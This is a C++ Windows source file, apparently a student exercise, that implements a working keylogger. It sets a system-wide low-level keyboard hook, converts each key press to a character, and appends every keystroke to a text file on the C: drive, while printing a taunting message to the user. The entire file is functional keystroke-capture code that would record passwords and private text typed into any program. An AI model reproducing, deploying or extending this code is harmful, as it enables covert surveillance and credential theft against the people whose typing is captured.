// Need this to have VK_OEM_* defined
#define _WIN32_WINNT    0x0501
#include <windows.h>
#include <winuser.h>
#include <cstdio>

#define STUDENT_ID      "0000000"

using namespace std;

bool isShiftDown()
{
    // the most significant bit is set if the key is down
    return GetAsyncKeyState(VK_SHIFT) & 0x8000;
}
bool isLowerCase()
{
    // the least significant bit is set if the key is toggled
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) == 0x0001;
    bool sht = isShiftDown();
    return (caps && sht) || (!caps && !sht);
}

char getKey(DWORD);

LRESULT WINAPI Handle(int code, WPARAM w, LPARAM l)
{
    // capture the event `key pressed down'
    if (w == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbhook = (KBDLLHOOKSTRUCT *) l;
        char key = getKey(kbhook->vkCode);
        if (key) {
            printf("%c", key);
            FILE *log_file = fopen("C:\\" STUDENT_ID ".txt", "a+");
            // only save when the file was opened successfully
            if (log_file) {
                fputc(key, log_file);
                // close it immediately since we cannot guarantee normal exit
                fclose(log_file);
            }
        }
    }
    return CallNextHookEx(NULL, code, w, l);
}


int main()
{
    HHOOK hMouseHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Handle, GetModuleHandle(NULL), 0);
    MSG msg;
    // print something to tease the user
    printf("Haha! You've started a Keylogger!!!\n"
            "Let's see what you have typed!!\n"
            "(Do you really believe I won't save it somewhere else!?):\n"
            "------------ (press ctrl+shift+alt+w to exit) ------------\n\n");

    // register ctrl+w
    if (RegisterHotKey(NULL, 1, MOD_CONTROL | MOD_SHIFT | MOD_ALT, 'W') == 0) {
        printf("hot key registration failed!.\n\n");
    }

    // dequeue the message queue
    while (GetMessage(&msg, NULL, 0, 0) != 0) {
        // exit the keylogger when ctrl+w is pressed
        if (msg.message == WM_HOTKEY) {
            UnhookWindowsHookEx(hMouseHook);                
            return 0;
        }
        // Translates virtual-key messages into character messages. 
        TranslateMessage(&msg);
        // Dispatches a message to a window procedure.
        DispatchMessage(&msg);  
    }

    return 0;
}

char getKey(DWORD vkCode)
{
    switch (vkCode) {
        case VK_SPACE:
            return ' ';
        case VK_NUMPAD0:
            return '0';
        case VK_NUMPAD1:
            return '1';
        case VK_NUMPAD2:
            return '2';
        case VK_NUMPAD3:
            return '3';
        case VK_NUMPAD4:
            return '4';
        case VK_NUMPAD5:
            return '5';
        case VK_NUMPAD6:
            return '6';
        case VK_NUMPAD7:
            return '7';
        case VK_NUMPAD8:
            return '8';
        case VK_NUMPAD9:
            return '9';
        case VK_MULTIPLY:
            return '*';
        case VK_ADD:
            return '+';
        case VK_SEPARATOR:
            return ',';
        case VK_SUBTRACT:
            return '-';
        case VK_DECIMAL:
            return '.';
        case VK_DIVIDE:
            return '/';
        default:
            if (vkCode >= '0' && vkCode <= '9') {
                // if 1~9 is pressed, check shift key
                const char syms[11] = ")!@#$%^&*(";
                if (isShiftDown()) {
                    return syms[vkCode-'0'];
                } else {
                    return vkCode;
                }
            } else if (vkCode >= 'A' && vkCode <= 'Z') {
                // check case if A~Z is pressed
                if (isLowerCase()) {
                    return vkCode-'A'+'a';
                } else {
                    return vkCode;
                }
            } else {
                // check if it's other symbol
                switch (vkCode) {
                    case VK_OEM_1:
                        return isShiftDown() ? ':' : ';';
                    case VK_OEM_PLUS:
                        return isShiftDown() ? '+' : '=';
                    case VK_OEM_COMMA:
                        return isShiftDown() ? '<' : ',';
                    case VK_OEM_MINUS:
                        return isShiftDown() ? '_' : '-';
                    case VK_OEM_PERIOD:
                        return isShiftDown() ? '>' : '.';
                    case VK_OEM_2:
                        return isShiftDown() ? '?' : '/';
                    case VK_OEM_3:
                        return isShiftDown() ? '~' : '`';
                    case VK_OEM_4:
                        return isShiftDown() ? '{' : '[';
                    case VK_OEM_5:
                        return isShiftDown() ? '|' : '\\';
                    case VK_OEM_6:
                        return isShiftDown() ? '}' : ']';
                    case VK_OEM_7:
                        return isShiftDown() ? '"' : '\'';
                    case VK_OEM_102:
                        return isShiftDown() ? '>' : '<';
                }
            }
    }
    // non-printable character
    return 0;
}
